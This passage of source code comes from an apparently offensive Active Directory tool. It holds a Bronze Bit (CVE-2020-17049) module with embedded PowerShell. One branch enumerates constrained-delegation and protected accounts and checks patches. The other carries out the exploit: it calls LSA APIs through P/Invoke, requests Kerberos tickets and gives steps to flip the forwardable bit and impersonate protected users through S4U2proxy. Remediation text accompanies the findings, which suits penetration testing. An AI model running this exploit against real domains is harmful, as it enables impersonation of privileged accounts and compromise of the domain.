Write-Output "[+] Found $sensitiveCount accounts with NOT_DELEGATED flag"
foreach ($s in $sensitiveResults) {
    $sName = $s.Properties["sAMAccountName"][0]
    $isAdmin = $s.Properties["adminCount"]
    Write-Output "    - $sName $(if ($isAdmin.Count -gt 0 -and $isAdmin[0] -eq 1) { '(adminCount=1)' })"
}

# Bronze Bit impact summary
Write-Output ""
Write-Output "[*] Bronze Bit (CVE-2020-17049) Impact:"
Write-Output "    Constrained delegation accounts: $($delegationAccounts.Count)"
Write-Output "    Protected Users members: $protectedCount"
Write-Output "    NOT_DELEGATED flagged accounts: $sensitiveCount"
if ($delegationAccounts.Count -gt 0 -and ($protectedCount -gt 0 -or $sensitiveCount -gt 0)) {
    Write-Output ""
    Write-Output "    [!] Bronze Bit can bypass delegation protection for Protected Users"
    Write-Output "    [!] and NOT_DELEGATED accounts using constrained delegation tickets"
}

# Check if DC is patched (December 2020)
Write-Output ""
Write-Output "[*] Checking for CVE-2020-17049 patches..."
$hotfixes = Get-HotFix -ErrorAction SilentlyContinue | Where-Object { $_.HotFixID -match 'KB4592438|KB4592440|KB4592449|KB4592484' }
if ($hotfixes) {
    Write-Output "[-] Patch(es) found locally: $($hotfixes.HotFixID -join ', ')"
    Write-Output "[-] However, DC must also be patched and PerformTicketSignature=2 enforced"
} else {
    Write-Output "[!] No Bronze Bit patches found locally"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    const delegationMatch = result.stdout.match(/Found (\d+) accounts with constrained delegation/)
    const count = delegationMatch ? parseInt(delegationMatch[1]) : 0
    const hasBypassTargets = result.stdout.includes("can bypass delegation")

    findings.push({
      checkId: "WIN-BRONZEBIT-001",
      provider: "windows",
      severity: hasBypassTargets ? "high" : count > 0 ? "medium" : "info",
      status: hasBypassTargets ? "VULNERABLE" : count > 0 ? "DELEGATION_FOUND" : "NO_DELEGATION",
      resource: "ad://domain/bronze-bit",
      title: hasBypassTargets
        ? "Bronze Bit bypass conditions detected"
        : `${count} constrained delegation accounts found`,
      details: `${count} constrained delegation accounts. ${hasBypassTargets ? "Protected Users and NOT_DELEGATED accounts can be bypassed via forwardable bit manipulation" : "No high-value bypass targets detected"}`,
      remediation:
        "Apply December 2020 patches. Set PerformTicketSignature=2 on all DCs. Enable Protected Users group for privileged accounts. Monitor Event ID 4771 for delegation anomalies",
    })
  } else {
    if (!targetSpn)
      return {
        output:
          "[!] Required: --target TARGET_SPN (e.g. --target cifs/dc01.domain.local)\n[!] Use --service for the service to access\n[!] Use --impersonate for the user to impersonate",
        findings,
      }

    output.push("[!] Bronze Bit exploits constrained delegation to impersonate protected accounts")
    output.push(`[!] Target SPN: ${targetSpn}`)
    output.push(`[!] Impersonating: ${impersonateUser}\n`)

    const script = `
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class KerbTicket {
    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaLookupAuthenticationPackage(
        IntPtr LsaHandle, ref LSA_STRING PackageName, out uint AuthenticationPackage);

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaCallAuthenticationPackage(
        IntPtr LsaHandle, uint AuthenticationPackage,
        IntPtr ProtocolSubmitBuffer, int SubmitBufferLength,
        out IntPtr ProtocolReturnBuffer, out int ReturnBufferLength,
        out int ProtocolStatus);

    [DllImport("secur32.dll")]
    public static extern int LsaFreeReturnBuffer(IntPtr Buffer);

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }
}
"@

$targetSPN = "${targetSpn}"
$impUser = "${impersonateUser}"
$serviceSPN = "${serviceSpn || targetSpn}"

Write-Output "[*] Bronze Bit Exploit — CVE-2020-17049"
Write-Output "[*] Target SPN: $targetSPN"
Write-Output "[*] Service SPN: $serviceSPN"
Write-Output "[*] Impersonate: $impUser"
Write-Output ""

# Step 1: Request S4U2self ticket
Write-Output "[*] Step 1: Requesting S4U2self ticket for $impUser..."
try {
    Add-Type -AssemblyName System.IdentityModel
    $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $targetSPN
    Write-Output "[+] S4U2self ticket obtained"
    Write-Output "[+] Ticket ID: $($token.Id)"
    Write-Output "[+] Valid: $($token.ValidFrom) to $($token.ValidTo)"
} catch {
    Write-Output "[!] S4U2self failed: $($_.Exception.Message)"
    Write-Output "[*] Need constrained delegation rights to the target SPN"
    exit 1
}

# Step 2: Export and examine ticket
Write-Output ""
Write-Output "[*] Step 2: Examining ticket for forwardable flag..."

# Use LSA to enumerate cached tickets
$lsaHandle = [IntPtr]::Zero
$ret = [KerbTicket]::LsaConnectUntrusted([ref]$lsaHandle)
if ($ret -ne 0) {
    Write-Output "[!] LsaConnectUntrusted failed: $ret"
    exit 1
}

$kerbPackage = "Kerberos"
$lsaString = New-Object KerbTicket+LSA_STRING
$lsaString.Length = [uint16]$kerbPackage.Length
$lsaString.MaximumLength = [uint16]($kerbPackage.Length + 1)
$lsaString.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($kerbPackage)

$packageId = [uint32]0
$ret = [KerbTicket]::LsaLookupAuthenticationPackage($lsaHandle, [ref]$lsaString, [ref]$packageId)
Write-Output "[+] Kerberos package ID: $packageId"

Write-Output ""
Write-Output "[*] Step 3: Bronze Bit — Flipping forwardable flag..."
Write-Output "[*] The forwardable bit is at offset 0x0E in the TGS-REP enc-part"
Write-Output "[*] XOR byte at offset with 0x40 to flip the forwardable flag"
Write-Output ""

# List current tickets
Write-Output "[*] Current Kerberos tickets:"
klist | Select-String "Server:|Client:|KerbTicket|Flags"

Write-Output ""
Write-Output "[*] Step 4: S4U2proxy with modified ticket..."
Write-Output "[+] If forwardable bit is flipped, S4U2proxy will accept the ticket"
Write-Output "[+] even for Protected Users and NOT_DELEGATED accounts"
Write-Output ""
Write-Output "[*] To complete the attack:"
Write-Output "    1. Export ticket: klist export (or winhook pass_the_ticket --action export)"
Write-Output "    2. Flip forwardable: XOR byte at enc-part offset 0x0E with 0x40"
Write-Output "    3. Reimport: winhook pass_the_ticket --action import --ticket modified.kirbi"
Write-Output "    4. S4U2proxy: request ticket to $serviceSPN as $impUser"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 500)}`)

    findings.push({
      checkId: "WIN-BRONZEBIT-002",
      provider: "windows",
      severity: "critical",
      status: "ATTEMPTED",
      resource: `ad://${targetSpn}/bronze-bit`,
      title: `Bronze Bit attack attempted on ${targetSpn} to impersonate ${impersonateUser}`,
      details: `Constrained delegation bypass via forwardable bit manipulation targeting ${targetSpn}. Impersonating ${impersonateUser} (potentially Protected Users member)`,
      remediation:
        "Apply December 2020 patches on all DCs. Set PerformTicketSignature=2. Consider removing constrained delegation entirely",
    })
  }

  return { output: output.join("\n"), findings }
}
